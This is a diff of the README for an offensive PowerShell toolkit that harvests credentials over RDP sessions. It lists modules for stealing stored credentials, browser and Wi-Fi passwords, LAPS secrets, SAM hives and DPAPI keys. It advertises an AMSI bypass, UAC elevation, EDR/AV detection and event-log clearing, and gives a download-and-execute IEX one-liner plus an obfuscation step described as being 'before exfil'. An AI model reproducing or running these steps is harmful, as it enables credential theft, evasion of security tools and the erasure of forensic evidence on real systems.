@@ -1,79 +1,70 @@
 <h1 align="center">RDP-Cred-Enum-Toolkit</h1>
-
 <p align="center">
-  <strong>Lightweight • Menu-Driven • RDP-Optimized Credential Enumeration</strong><br>
-  Post-exploitation credential harvesting toolkit for Windows systems accessed via RDP.
+  <strong>Lightweight • Menu-Driven • RDP-Focused Credential & Security Enumeration</strong><br>
+  Post-exploitation toolkit optimized for interactive Windows RDP sessions.
 </p>
 
 <p align="center">
   <a href="https://github.com/shaheeryasiofficial/rdp-cred-enum-toolkit/stargazers">
-    <img src="https://img.shields.io/github/stars/shaheeryasiofficial/rdp-cred-enum-toolkit?style=for-the-badge&logo=github&color=yellow" alt="GitHub stars">
+    <img src="https://img.shields.io/github/stars/shaheeryasiofficial/rdp-cred-enum-toolkit?style=for-the-badge&logo=github&color=yellow" alt="Stars">
   </a>
   <a href="https://github.com/shaheeryasiofficial/rdp-cred-enum-toolkit/issues">
-    <img src="https://img.shields.io/github/issues/shaheeryasiofficial/rdp-cred-enum-toolkit?style=for-the-badge&logo=github&color=red" alt="GitHub issues">
+    <img src="https://img.shields.io/github/issues/shaheeryasiofficial/rdp-cred-enum-toolkit?style=for-the-badge&logo=github&color=red" alt="Issues">
   </a>
   <a href="https://github.com/shaheeryasiofficial/rdp-cred-enum-toolkit/blob/main/LICENSE">
-    <img src="https://img.shields.io/github/license/shaheeryasiofficial/rdp-cred-enum-toolkit?style=for-the-badge&logo=opensourceinitiative&color=green" alt="License">
+    <img src="https://img.shields.io/github/license/shaheeryasiofficial/rdp-cred-enum-toolkit?style=for-the-badge&color=green" alt="License">
   </a>
   <br>
   <img src="https://img.shields.io/badge/PowerShell-5.1+-blue?style=for-the-badge&logo=powershell&logoColor=white" alt="PowerShell">
-  <img src="https://img.shields.io/badge/Windows-10%20%7C%2011%20%7C%20Server-important?style=for-the-badge&logo=windows&logoColor=white" alt="Windows">
+  <img src="https://img.shields.io/badge/Windows-10%20%7C%2011%20%7C%20Server-important?style=for-the-badge&logo=windows" alt="Windows">
   <img src="https://img.shields.io/badge/Red%20Team-Post%20Exploitation-orange?style=for-the-badge" alt="Red Team">
 </p>
 
 <div align="center">
-  <br>
-  🔴 Lightweight • Living-off-the-land • Minimal footprint • Menu-driven
-  <br><br>
+  🔴 Minimal footprint • Living-off-the-land • No binaries • Administrator-friendly
 </div>
 
 ---
 
-### Features
+### Core Features
 
-- Interactive menu run single modules or everything at once (`A`)
-- Basic AMSI bypass via reflection (included at the top)
-- Privilege escalation attempt (UAC fallback when not elevated)
-- **Plain text output by default** easy to read & exfiltrate immediately
-- Optional XOR + Base64 encoding (key 0x42 → `.xor64`) via menu option `E`
-- No binaries dropped uses only native Windows commands & PowerShell
-- Designed for interactive RDP sessions (user or elevated context)
-- Timestamped loot folder created on Desktop
+- Clean interactive menu
+- AMSI bypass (reflection)
+- UAC elevation attempt if not already admin
+- Timestamped loot folder on Desktop
+- Plain-text + JSON/CSV output — easy to read & exfiltrate
+- Designed for **RDP sessions** (user or elevated context)
 
-### Enumeration Modules
+### Enumeration & Detection Modules
 
-| #  | Module                                      | Admin?       | Main Output File(s)                          | Purpose / Typical Value                   |
-|----|---------------------------------------------|--------------|----------------------------------------------|-------------------------------------------|
-| 1  | Windows Credential Manager                  | Sometimes    | `credman_all.csv`                            | Vault, generic, domain, web creds         |
-| 2  | cmdkey stored credentials                   | No           | `cmdkey_list.txt`                            | Network shares, RDP, WinRM saved logins   |
-| 3  | Wi-Fi profiles & passwords                  | No           | `wifi_passwords.csv`                         | Cleartext Wi-Fi keys                      |
-| 4  | Saved RDP connections & credential blobs    | No           | `cred_blobs.csv`, `rdp_servers.reg.txt`      | RDP history & targets                     |
-| 5  | Browser saved passwords                     | No           | `Chrome_creds.sqlite`, `Edge_creds.sqlite`, `Firefox_creds.json` | Chrome / Edge / Firefox login data |
-| 6  | LAPS local admin passwords                  | AD rights    | `laps.txt`                                   | ms-Mcs-AdmPwd attribute                   |
-| 7  | IE / legacy Edge IntelliForms               | No           | `ie_intelliforms.reg.txt`                    | Legacy saved form data                    |
-| 8  | Unattended / sysprep / setup files          | No           | `unattend_*.xml`, `unattend_*.txt`           | Plaintext creds from deployment remnants  |
-| 9  | Recent files, RunMRU, PowerShell history    | No           | `recent.csv`, `runmru.txt`, `ps_history.txt` | User activity & command traces            |
-| 10 | SAM / SYSTEM / SECURITY hives               | Yes + priv   | `SAM`, `SYSTEM`, `SECURITY`                  | NTLM hashes (offline cracking)            |
-| A  | Run **ALL** modules                         | Varies       | All files above                              | Complete credential sweep                 |
-| E  | Encode all loot (XOR+Base64)                | —            | All files → `.xor64` (originals deleted)     | Optional obfuscation before exfil         |
-| 0  | Exit                                        | —            | —                                            | —                                         |
+| #  | Module                                          | Admin? | Main Output File(s)                        | Value / Purpose                              |
+|----|-------------------------------------------------|--------|--------------------------------------------|----------------------------------------------|
+| 1  | Windows Credential Manager                      | —      | `credman.json`, `credman.csv`              | Vault + generic creds                        |
+| 2  | cmdkey saved network credentials                | No     | `cmdkey.json`                              | RDP, WinRM, share logins                     |
+| 3  | Wi-Fi profiles + cleartext passwords            | No     | `wifi.json`                                | Wi-Fi keys                                   |
+| 4  | Saved RDP connections & credential blobs        | No     | `rdp_cred_blobs.json`, `rdp_*.reg.txt`     | RDP history & targets                        |
+| 5  | Browser saved passwords (Chrome/Edge/Firefox)   | No     | `browser_*.sqlite`, `browser_*.json`       | Login data files                             |
+| 6  | LAPS local admin password                       | AD     | `laps.json`                                | ms-Mcs-AdmPwd attribute                      |
+| 7  | Unattended / sysprep files                      | No     | `unattended_*`                             | Deployment remnant credentials               |
+| 8  | SAM / SYSTEM / SECURITY hives                   | Yes    | `sam.hive`, `system.hive`, `security.hive` | NTLM hashes (offline cracking)               |
+| 9  | DPAPI master key locations                      | No     | `dpapi_masterkeys.json`                    | Master keys for credential decryption        |
+| 10 | Scheduled Tasks with stored credentials         | No     | `scheduled_tasks_creds.json`               | Tasks running with saved passwords           |
+|    |                                                 |        |                                            |                                              |
+| 11 | Installed AV / Security Products                | No     | `installed_antivirus.json`                 | Registered AV engines                        |
+| 12 | Quick EDR / AV process & service detection      | No     | `edr_av_processes_services.json`           | Common EDR/AV indicators                     |
+| 13 | Most common EDR drivers & services              | No     | `edr_drivers.json`                         | Kernel-level EDR drivers                     |
+| 14 | Windows Defender status + protections           | No     | `defender_status.json`                     | Real-time, tamper protection, scans          |
+| 15 | Security-related running processes              | No     | `security_related_processes.json`          | EDR/AV process list                          |
+| C  | Clear common event logs                         | Yes    | —                                          | Security, System, Defender, PowerShell logs  |
+| 0  | Exit                                            | —      | —                                          | —                                            |
 
-### Quick Start
+### Quick Start (RDP)
 
-**Method 1 Paste & Execute** (recommended in most RDP scenarios)
+1. Open PowerShell (preferably as Administrator)
+2. Paste the entire script and press Enter
+3. Use the menu: type `1`–`15`, `C`, or `0`
 
-1. Open PowerShell in the RDP session (preferably as administrator)
-2. Copy the **entire script** from [`rdp-cred-enum-toolkit.ps1`](rdp-cred-enum-toolkit.ps1)
-3. Paste it into the PowerShell console and press Enter
-4. Use the menu: type a number (1–10), `A` (all), or `E` (encode loot)
-
-**Method 2 Encoded one-liner** (better for evasion / memory-only execution)
-
-Generate the Base64-encoded version of the full script first (on your machine):
+### One-liner (memory-only execution)
 
 ```powershell
-# Run locally (not on target)
-$scriptContent = Get-Content -Path .\rdp-cred-enum-toolkit.ps1 -Raw -Encoding UTF8
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($scriptContent)
-$encoded = [Convert]::ToBase64String($bytes)
-Set-Clipboard -Value $encoded   # or $encoded | Set-Content encoded.txt
+powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/shaheeryasiofficial/rdp-cred-enum-toolkit/main/rdp-cred-enum-toolkit.ps1')"
